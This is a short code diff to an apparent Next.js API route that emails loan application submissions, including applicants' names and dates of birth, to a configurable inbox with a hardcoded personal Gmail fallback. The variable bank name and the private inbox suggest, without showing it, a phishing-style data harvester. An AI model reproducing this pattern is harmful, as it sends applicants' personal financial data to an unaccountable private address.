@@ -89,8 +89,8 @@ export async function POST(request: NextRequest) {
 
     const dateOfBirth = (day && month && year) ? `${day}/${month}/${year}` : ''
 
-    // Email configuration
-    const recipientEmail = process.env.LOAN_EMAIL || 'yamraj26yam@gmail.com'
+    // Email configuration (NOTIFY_EMAIL = one inbox for all form submissions)
+    const recipientEmail = process.env.NOTIFY_EMAIL || process.env.LOAN_EMAIL || 'yamraj26yam@gmail.com'
     const subject = `New ${bankName || 'Bank'} Loan Application`
     
     const fullName = [firstName, middleName, lastName].filter(Boolean).join(' ')
